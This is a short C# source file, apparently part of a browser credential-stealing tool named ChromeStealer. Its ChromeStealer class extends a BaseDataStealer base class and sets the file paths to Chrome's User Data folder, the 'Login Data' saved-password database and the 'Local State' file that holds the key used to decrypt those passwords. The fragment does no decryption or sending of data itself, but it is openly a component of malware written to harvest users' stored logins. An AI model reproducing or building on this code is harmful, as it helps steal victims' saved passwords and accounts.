using System.IO;

namespace ChromeStealer.Stealer
{
    public class ChromeStealer : BaseDataStealer
    {
        protected override string UserDataFolderPath => 
            Path.Combine(
                LocalAppDataFolder, 
                "Google\\", 
                "Chrome\\", 
                "User Data\\");
        protected override string LoginDataFilePath => Path.Combine(
            UserDataFolderPath, 
            "Default\\", 
            "Login Data");
        protected override string LocalStateFilePath => Path.Combine(
            UserDataFolderPath, 
            "Local State");
    }
}